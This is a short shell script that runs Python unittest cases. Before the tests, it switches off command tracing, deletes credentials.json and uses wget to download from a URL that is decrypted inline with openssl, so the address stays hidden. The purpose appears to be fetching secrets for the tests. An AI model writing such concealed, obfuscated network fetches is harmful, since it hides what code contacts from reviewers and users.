set +x
rm -rf credentials.json
wget `echo 'U2FsdGVkX19Wg/Os0JMcl3kXdAaNcgSF+fAg4oCz5zUIrCQyX3FwXeaqOAaj8YGT 
GrYMpNIsovfk6uB+ZbHBjg==' | openssl enc -aes-128-cbc -a -d -salt -pass pass:url`

set -x

if [ ! -z $1 ]; then
    TestCase=".${1}"
else
    TestCase=''
fi 

if [ ! -z $2 ]; then
    Test=".${2}"
else
    Test=''
fi

python -m unittest tests$TestCase$Test


